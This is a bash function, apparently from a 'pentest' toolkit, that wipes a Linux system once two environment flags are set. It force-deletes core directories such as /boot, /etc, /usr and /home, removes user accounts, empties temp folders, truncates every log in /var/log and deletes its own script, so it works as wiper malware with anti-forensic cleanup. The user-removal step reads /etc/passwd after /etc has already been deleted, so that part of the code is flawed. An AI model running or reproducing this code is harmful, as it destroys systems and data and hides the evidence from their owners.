#!/usr/bin/env bash

destroy_system() {
    local real_delete="${1:-0}"
    
    if [[ "$real_delete" != "1" ]]; then
        log_warn "SIMULATION mode - No deletion"
        return 0
    fi
    
    if [[ "${PENTEST_VM:-0}" != "1" ]]; then
        log_error "PENTEST_VM not enabled - Aborting"
        return 1
    fi
    
    log_warn "[+] Starting system destruction"
    
    local dirs_to_delete=(
        "/boot" "/bin" "/sbin" "/lib" "/lib64"
        "/etc" "/opt" "/usr" "/var" "/home" "/root"
    )
    
    for dir in "${dirs_to_delete[@]}"; do
        if [[ -d "$dir" ]]; then
            log_warn "Deleting $dir"
            
            command -v chattr >/dev/null 2>&1 && chattr -R -i "$dir" 2>/dev/null || true
            
            sudo rm -rf "$dir" 2>/dev/null || true
            command -v sudo >/dev/null 2>&1 && sudo rm -rf "$dir" 2>/dev/null || true
        fi
    done
    
    if [[ -f /etc/passwd ]]; then
        while IFS=: read -r user _; do
            if [[ "$user" != "root" ]] && [[ "$user" != "nobody" ]]; then
                userdel -f "$user" 2>/dev/null || true
            fi
        done < /etc/passwd
    fi
    
    sudo rm -rf /tmp/* /var/tmp/* 2>/dev/null || true
    find /var/log -type f -exec truncate -s 0 {} \; 2>/dev/null || true
    
    log_done "System destroyed"
    
    rm -f "$0" 2>/dev/null || true
    
    exit 0
}